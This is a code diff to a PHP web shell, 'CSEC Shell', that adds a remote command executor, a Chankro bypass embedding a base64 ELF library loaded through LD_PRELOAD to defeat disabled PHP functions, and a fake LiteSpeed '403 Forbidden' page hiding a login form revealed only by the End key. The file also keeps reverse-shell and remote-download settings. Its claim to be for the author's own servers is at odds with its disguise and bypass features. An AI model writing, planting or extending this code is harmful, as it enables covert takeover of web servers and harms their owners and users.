@@ -1,6 +1,6 @@
 <?php
 /**
- * CSEC PHP Shell 0.6 (hardened, modular, no-session)
+ * CSEC Shell 0.7 (hardened, modular, no-session)
  * ----------------------------------------------------------
  * Safe, single-file Shell for YOUR OWN SERVERS ONLY.
  * - No PHP sessions; uses short-lived HMAC token (URL or HttpOnly cookie)
@@ -17,9 +17,9 @@
  */
 
 // ===================== CONFIG ===================== //
-const APP_NAME     = 'CSEC Shell 0.6';
+const APP_NAME     = 'CSEC Shell 0.7';
 const BASE_DIR     = DIRECTORY_SEPARATOR;                 // jail root (absolute)
-const LOGIN_PASS   = 'enteraja';            // change me
+const PASSWORD_HASH = '$2y$10$hJlmcJN54Oq74ba3URwEmOkkm8EPZ0SkpufGKZchc9gtkslXfA9ci';
 const TOKEN_TTL    = 3600;                    // seconds (1h)
 const BIND_IP      = false;                    // bind token to client IP
 const USE_COOKIE   = true;                    // deliver token via HttpOnly cookie instead of URL
@@ -30,6 +30,9 @@ const ENABLE_BC = true;
 const ENABLE_REMOTE = true; 
 const BC_DEFAULT_HOST = '127.0.0.1';
 const BC_DEFAULT_PORT = '4444';
+
+const ENABLE_CMD_EXEC = true;
+const CMD_METHODS = ['exec', 'shell_exec', 'system', 'passthru', 'proc_open'];
 
 // Feature flags
 const ENABLE_EDIT        = true;
@@ -46,6 +49,46 @@ const ENABLE_BULK        = true;
 error_reporting(0);
 set_time_limit(0);
 mb_internal_encoding('UTF-8');
+
+
+$bc_host = BC_DEFAULT_HOST;
+$bc_port = BC_DEFAULT_PORT;
+$bc_method = 'php';
+
+
+function execute_chankro_bypass($command, $dir) {
+    $hook = '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BwAAAAwAAAAAAAAAAAAAAEiD7AhIiwW9CCAASIXAdAL/0EiDxAjDAP810gggAP8l1AggAA8fQAD/JdIIIABoAAAAAOng/////yXKCCAAaAEAAADp0P////8lwgggAGgCAAAA6cD/////JboIIABoAwAAAOmw/////yWyCCAAaAQAAADpoP////8lqgggAGgFAAAA6ZD/////JboIIABoBgAAAOmA/////yWaCCAAaAcAAADpcP////8lkgggAGgIAAAA6WD/////JSIIIABmkAAAAAAAAAAASI09gQggAEiNBYEIIABVSCn4SInlSIP4DnYVSIsF1gcgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QAAAAAAEiNPUEIIABIjTU6CCAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWhByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD3xByAAAHUnSIM9dwcgAABVSInldAxIiz3SByAA6D3////oSP///13GBcgHIAAB88MPH0AAZi4PH4QAAAAAAEiNPVkFIABIgz8AdQvpXv///2YPH0QAAEiLBRkHIABIhcB06VVIieX/0F3pQP///1VIieVIjT16AAAA6FD+//++/wEAAEiJx+iT/v//SI09YQAAAOg3/v//SInH6E/+//+QXcNVSInlvgEAAAC/AQAAAOhZ/v//6JT+//+FwHQKvwAAAADodv7//5Bdw1VIieVIjT0lAAAA6FP+///o/v3//+gZ/v//kF3DAABIg+wISIPECMNDSEFOS1JPAExEX1BSRUxPQUQAARsDOzQAAAAFAAAAuP3//1AAAABY/v//eAAAAGj///+QAAAAnP///7AAAADF////0AAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAGD9//+gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAADY/f//CAAAAAAAAAAAAAAAHAAAAFwAAADQ/v//NAAAAABBDhCGAkMNBm8MBwgAAAAcAAAAfAAAAOT+//8pAAAAAEEOEIYCQw0GZAwHCAAAABwAAACcAAAA7f7//x0AAAAAQQ4QhgJDDQZYDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAgAAAAAAAAAAAAAAAAAAHAIAAAAAAAAAAAAAAAAAAABAAAAAAAAALsAAAAAAAAADAAAAAAAAAAYBwAAAAAAAA0AAAAAAAAAXAkAAAAAAAAZAAAAAAAAAPgNIAAAAAAAGwAAAAAAAAAQAAAAAAAAABoAAAAAAAAACA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAAMAQAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAADpAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAADYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAEAGAAAAAAAABwAAAAAAAABoBQAAAAAAAAgAAAAAAAAA2AAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAABIBQAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAABoFAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYHAAAAAAAAVgcAAAAAAABmBwAAAAAAAHYHAAAAAAAAhgcAAAAAAACWBwAAAAAAAKYHAAAAAAAAtgcAAAAAAADGBwAAAAAAAGAQIAAAAAAAR0NDOiAoRGViaWFuIDYuMy4wLTE4K2RlYjl1MSkgNi4zLjAgMjAxNzA1MTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQDIAQAAAAAAAAAAAAAAAAAAAAAAAAMAAgDwAQAAAAAAAAAAAAAAAAAAAAAAAAMAAwA4AgAAAAAAAAAAAAAAAAAAAAAAAAMABAAwBAAAAAAAAAAAAAAAAAAAAAAAAAMABQAaBQAAAAAAAAAAAAAAAAAAAAAAAAMABgBIBQAAAAAAAAAAAAAAAAAAAAAAAAMABwBoBQAAAAAAAAAAAAAAAAAAAAAAAAMACABABgAAAAAAAAAAAAAAAAAAAAAAAAMACQAYBwAAAAAAAAAAAAAAAAAAAAAAAAMACgAwBwAAAAAAAAAAAAAAAAAAAAAAAAMACwDQBwAAAAAAAAAAAAAAAAAAAAAAAAMADADgBwAAAAAAAAAAAAAAAAAAAAAAAAMADQBcCQAAAAAAAAAAAAAAAAAAAAAAAAMADgBlCQAAAAAAAAAAAAAAAAAAAAAAAAMADwB4CQAAAAAAAAAAAAAAAAAAAAAAAAMAEACwCQAAAAAAAAAAAAAAAAAAAAAAAAMAEQD4DSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAIDiAAAAAAAAAAAAAAAAAAAAAAAAMAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAMAFAAYDiAAAAAAAAAAAAAAAAAAAAAAAAMAFQDYDyAAAAAAAAAAAAAAAAAAAAAAAAMAFgAAECAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgECAAAAAAAAAAAAAAAAAAAAAAAAMAGABoECAAAAAAAAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAGQAAAAIADADgBwAAAAAAAAAAAAAAAAAAGwAAAAIADAAgCAAAAAAAAAAAAAAAAAAALgAAAAIADABwCAAAAAAAAAAAAAAAAAAARAAAAAEAGABoECAAAAAAAAEAAAAAAAAAUwAAAAEAEgAIDiAAAAAAAAAAAAAAAAAAegAAAAIADACwCAAAAAAAAAAAAAAAAAAAhgAAAAEAEQD4DSAAAAAAAAAAAAAAAAAApQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAArAAAAAEAEABoCgAAAAAAAAAAAAAAAAAAugAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAxgAAAAEAFwBgECAAAAAAAAAAAAAAAAAA0wAAAAEAFAAYDiAAAAAAAAAAAAAAAAAA3AAAAAAADwB4CQAAAAAAAAAAAAAAAAAA7wAAAAEAFwBoECAAAAAAAAAAAAAAAAAA+wAAAAEAFgAAECAAAAAAAAAAAAAAAAAAEQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAJQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAQQEAABAAFwBoECAAAAAAAAAAAAAAAAAASAEAABIADAAUCQAAAAAAACkAAAAAAAAAUgEAABIADQBcCQAAAAAAAAAAAAAAAAAAWAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAbAEAABIADADgCAAAAAAAADQAAAAAAAAAcAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAhAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAkwEAABIADAA9CQAAAAAAAB0AAAAAAAAAnQEAABAAGABwECAAAAAAAAAAAAAAAAAAogEAABAAGABoECAAAAAAAAAAAAAAAAAArgEAABIAAAAAAAAAAAAAAAAAAAAAAAAAwQEAACAAAAAAAAAAAAAAAAAAAAAAAAAA1QEAABIAAAAAAAAAAAAAAAAAAAAAAAAA6wEAABIAAAAAAAAAAAAAAAAAAAAAAAAA/QEAACAAAAAAAAAAAAAAAAAAAAAAAAAAFwIAACIAAAAAAAAAAAAAAAAAAAAAAAAAMwIAABIACQAYBwAAAAAAAAAAAAAAAAAAOQIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21wbGV0ZWQuNjk3MgBfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9kdW1teQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAaG9vay5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1RNQ19FTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AZ2V0ZW52QEBHTElCQ18yLjIuNQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2VkYXRhAGRhZW1vbml6ZQBfZmluaQBzeXN0ZW1AQEdMSUJDXzIuMi41AHB3bgBzaWduYWxAQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAHByZWxvYWRtZQBfZW5kAF9fYnNzX3N0YXJ0AGNobW9kQEBHTElCQ18yLjIuNQBfSnZfUmVnaXN0ZXJDbGFzc2VzAHVuc2V0ZW52QEBHTElBQkNfMi4yLjUAX2V4aXRAQEdMSUJDXzIuMi41AF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AF9pbml0AGZvcmtAQEdMSUJDXzIuMi41AA==';
+    
+    // Tulis file chankro.so dan acpid.socket
+    file_put_contents($dir . '/chankro.so', base64_decode($hook));
+    file_put_contents($dir . '/acpid.socket', base64_encode($command . " 2>&1"));
+    
+    // Set environment variables
+    putenv('CHANKRO=' . $dir . '/acpid.socket');
+    putenv('LD_PRELOAD=' . $dir . '/chankro.so');
+    
+    // Try different bypass functions
+    $output = '';
+    $bypass_functions = ['mail', 'mb_send_mail', 'error_log', 'imap_mail'];
+    
+    foreach ($bypass_functions as $func) {
+        if (function_exists($func)) {
+            call_user_func($func, 'a', 'a', 'a', 'a');
+            $output = "<div class='flash-ok'>Chankro bypass attempted via $func</div>";
+            break;
+        }
+    }
+    
+    if (empty($output)) {
+        $output = "<div class='flash-err'>No bypass function available</div>";
+    }
+    
+    // Cleanup
+    @unlink($dir . '/chankro.so');
+    @unlink($dir . '/acpid.socket');
+    
+    return $output;
+}
 
 /**
  * Back Connect Reverse Shell
@@ -188,6 +231,8 @@ function download_remote_file($url, $filename, $current_dir) {
             }
         }
     }
+
+    
     
     // Method 2: cURL (if available)
     if (!$success && function_exists('curl_init')) {
@@ -352,10 +397,8 @@ function send_download(string $file): void {
     readfile($file); exit;
 }
 
-// ================== TOKEN AUTH (no session) ================== //
-function pass_hash(): string { return password_hash(LOGIN_PASS, PASSWORD_DEFAULT); }
 // To avoid recalculating new salt every request, derive a static secret from LOGIN_PASS
-function secret_key(): string { return hash(HASH_ALGO, LOGIN_PASS.'|'.base(), true); }
+function secret_key(): string { return hash(HASH_ALGO, PASSWORD_HASH.'|'.base(), true); }
 function make_token(): string {
     $payload = [
         'iat'=>now(), 'exp'=>now()+TOKEN_TTL,
@@ -443,6 +486,10 @@ function unique_path(string $path): string {
     return $candidate;
 }
 
+function flash_get(): array {
+    global $flash;
+    return $flash;
+}
 
 // ================== LOGIN GATE ================== //
 $tok = current_token();
@@ -450,17 +497,55 @@ if (!$tok || !check_token($tok)) {
     // Simple password POST -> issue token
     $err = false;
     if (($_SERVER['REQUEST_METHOD']??'GET')==='POST' && isset($_POST['pass'])) {
-        if (hash_equals(LOGIN_PASS, (string)$_POST['pass'])) {
+        if (password_verify((string)$_POST['pass'], PASSWORD_HASH)) {
             deliver_token(make_token());
         } else { $err = true; }
     }
-    echo '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">'
-        .'<title>Login Shell</title>'
-        .'<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>'
-        .'<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">'
-        .'<style>:root{--bg:#0e141b;--panel:#141b23;--border:#263241;--text:#e0e6ee;--muted:#7b8da1;--accent:#15c15d}*{box-sizing:border-box}html,body{height:100%}body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,system-ui,Segoe UI,Roboto,Arial;display:flex;align-items:center;justify-content:center}.login{background:var(--panel);border:1px solid var(--border);border-radius:14px;width:320px;padding:22px;box-shadow:0 12px 30px rgba(0,0,0,.35)}.login h2{margin:0 0 14px;font-size:18px;color:#e8eef7}.login input{width:100%;padding:12px 14px;border-radius:10px;border:1px solid #2d3b4d;background:#0f1620;color:var(--text);outline:none}.btn{width:100%;background:var(--accent);border:0;color:#0b1117;border-radius:10px;padding:12px 14px;font-weight:700;cursor:pointer;margin-top:12px}.btn:hover{filter:brightness(1.05)}.error{margin-top:10px;background:#5c2b29;color:#fff;padding:10px 12px;border-radius:10px;font-size:14px}.brand{position:fixed;left:16px;bottom:12px;color:var(--muted);font-size:12px}</style></head><body>'
-        .'<div class="login"><form method="POST"><input type="password" name="pass" placeholder="Enter password"><button class="btn" type="submit">Login</button>'
-        .($err?'<div class="error">Wrong password!</div>':'').'</form></div><div class="brand">'.h(APP_NAME).'</div></body></html>';
+    
+    echo '<html style="height:100%">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+<title> 403 Forbidden
+</title>
+<style>
+    @media (prefers-color-scheme: dark) {
+        body { background-color: #000!important; }
+    }
+</style>
+</head>
+<body style="color: #444; margin:0; font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
+    <div style="height:auto; min-height:100%;">
+        <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
+            <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1>
+            <h2 style="margin-top:20px;font-size: 30px;">Forbidden</h2>
+            <p>Access to this resource on the server is denied!</p>
+            ' . ($err ? '<p style="color: red; font-weight: bold;">Wrong password!</p>' : '') . '
+        </div>
+    </div>
+    <div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
+        <br>Proudly powered by LiteSpeed Web Server
+        <p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
+    </div>
+
+    <!-- Hidden form login with only input box -->
+    <form class="hidden-form" method="POST" id="loginForm" style="display: none;">
+        <input type="password" name="pass" id="password" placeholder="Enter password" required>
+    </form>
+
+    <script>
+        // Form initially hidden
+        document.querySelector(".hidden-form").style.display = "none";
+
+        document.addEventListener("keydown", function(event) {
+            if (event.key === "End") { 
+                // When End key is pressed, show the form
+                document.querySelector(".hidden-form").style.display = "block";
+                document.getElementById("password").focus();
+            }
+        });
+    </script>
+</body>
+</html>';
     exit;
 }
 
@@ -484,6 +569,94 @@ $mut = ($_SERVER['REQUEST_METHOD']??'GET')==='POST' || isset($_GET['delete']) ||
 if ($mut && (!isset($_REQUEST['csrf']) || !csrf_check((string)$_REQUEST['csrf']))) {
     flash('error','Invalid CSRF token.');
 } else {
+
+    // ===== System Command Execution =====
+    if (ENABLE_CMD_EXEC && isset($_POST['cmd_command'])) {
+        $command = trim($_POST['cmd_command']);
+        $method = $_POST['cmd_method'] ?? 'auto';
+        $cmd_output = '';
+        
+        if (empty($command)) {
+            flash('error', 'Command cannot be empty');
+        } else {
+            // Security: basic command validation
+            $dangerous_commands = ['mkfs.ext4'];
+            $is_dangerous = false;
+            foreach ($dangerous_commands as $dangerous) {
+                if (stripos($command, $dangerous) !== false) {
+                    $is_dangerous = true;
+                    break;
+                }
+            }
+            
+            if ($is_dangerous) {
+                flash('error', 'Potentially dangerous command blocked');
+            } else {
+                // Execute based on selected method
+                switch ($method) {
+                    case 'exec':
+                        if (function_exists('exec')) {
+                            exec($command . ' 2>&1', $output, $return_var);
+                            $cmd_output = implode("\n", $output);
+                        } else {
+                            flash('error', 'exec() function is disabled');
+                        }
+                        break;
+                        
+                    case 'shell_exec':
+                        if (function_exists('shell_exec')) {
+                            $cmd_output = shell_exec($command . ' 2>&1');
+                        } else {
+                            flash('error', 'shell_exec() function is disabled');
+                        }
+                        break;
+                        
+                    case 'system':
+                        if (function_exists('system')) {
+                            ob_start();
+                            system($command . ' 2>&1', $return_var);
+                            $cmd_output = ob_get_clean();
+                        } else {
+                            flash('error', 'system() function is disabled');
+                        }
+                        break;
+                        
+                    case 'chankro':
+                        $cmd_output = execute_chankro_bypass($command, $cwd);
+                        break;
+                        
+                    case 'auto':
+                    default:
+                        // Try all available methods
+                        if (function_exists('shell_exec')) {
+                            $cmd_output = shell_exec($command . ' 2>&1');
+                        } elseif (function_exists('exec')) {
+                            exec($command . ' 2>&1', $output, $return_var);
+                            $cmd_output = implode("\n", $output);
+                        } elseif (function_exists('system')) {
+                            ob_start();
+                            system($command . ' 2>&1', $return_var);
+                            $cmd_output = ob_get_clean();
+                        } elseif (function_exists('passthru')) {
+                            ob_start();
+                            passthru($command . ' 2>&1', $return_var);
+                            $cmd_output = ob_get_clean();
+                        } else {
+                            $cmd_output = execute_chankro_bypass($command, $cwd);
+                        }
+                        break;
+                }
+                
+                if (!empty($cmd_output)) {
+                    flash('ok', 'Command executed successfully');
+                    // Store output for display
+                    $GLOBALS['cmd_output'] = $cmd_output;
+                } elseif (empty(flash_get())) {
+                    flash('info', 'Command executed but no output returned');
+                }
+            }
+        }
+    }
         // ===== NEW: Back Connect Reverse Shell =====
     if (ENABLE_BC && isset($_POST['bc_host'], $_POST['bc_port'])) {
         $host = trim($_POST['bc_host']);
@@ -1405,6 +1578,33 @@ input[type=text],input[type=file],input[type=url],textarea{width:100%;background
             <?php endif; ?>
         </div>
     </div>
+
+    <?php if (ENABLE_CMD_EXEC): ?>
+    <div class="box">
+        <h3>System Command Executor</h3>
+        <form method="POST" onsubmit="return addCsrf(this)" class="flex-form">
+            <input type="text" name="cmd_command" placeholder="Enter command (e.g., ls -la, whoami, pwd)" style="flex: 2;" required>
+            <select name="cmd_method" style="flex: 1;">
+                <option value="auto">Auto Detect</option>
+                <option value="exec">exec</option>
+                <option value="shell_exec">shell_exec</option>
+                <option value="system">system</option>
+                <option value="passthru">passthru</option>
+                <option value="proc_open">proc_open</option>
+                <option value="chankro">Chankro Bypass</option>
+            </select>
+            <input type="hidden" name="dir" value="<?= h($cwd) ?>">
+            <button class="btn" type="submit" style="background: #17a2b8;">Execute</button>
+        </form>
+        
+        <?php if (isset($cmd_output)): ?>
+            <div class="box" style="margin-top: 10px; background: #0f1620; border: 1px solid var(--border);">
+                <h4>Command Output:</h4>
+                <pre style="color: var(--text); background: #0a0f17; padding: 10px; border-radius: 6px; overflow: auto; max-height: 300px;"><?= h($cmd_output) ?></pre>
+            </div>
+        <?php endif; ?>
+    </div>
+    <?php endif; ?>
 
     <form id="bulkItems" method="POST" style="display:none"></form>
 
